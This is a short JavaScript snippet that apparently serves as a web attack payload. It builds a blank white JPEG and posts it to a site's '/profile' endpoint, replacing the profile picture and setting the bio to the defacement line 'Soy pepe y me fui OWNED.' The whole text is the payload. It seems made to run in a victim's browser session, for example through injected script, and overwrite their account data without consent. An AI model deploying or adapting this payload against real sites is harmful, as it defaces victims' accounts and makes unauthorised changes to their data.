const url='/profile';const canvas=document.createElement('canvas');canvas.width=400;canvas.height=400;const context=canvas.getContext('2d');context.fillStyle='white';context.fillRect(0,0,canvas.width,canvas.height);const blob=await new Promise(resolve=>canvas.toBlob(resolve,'image/jpeg'));const formData=new FormData();formData.append('bio','Soy pepe y me fui OWNED.');formData.append('profile_pic',blob,'blank_image.jpg');const uploadResponse=await fetch(url,{method:'POST',body:formData,});if(uploadResponse.ok){console.log('Blank image uploaded successfully!')}else{console.error('Image upload failed:',uploadResponse.statusText)}
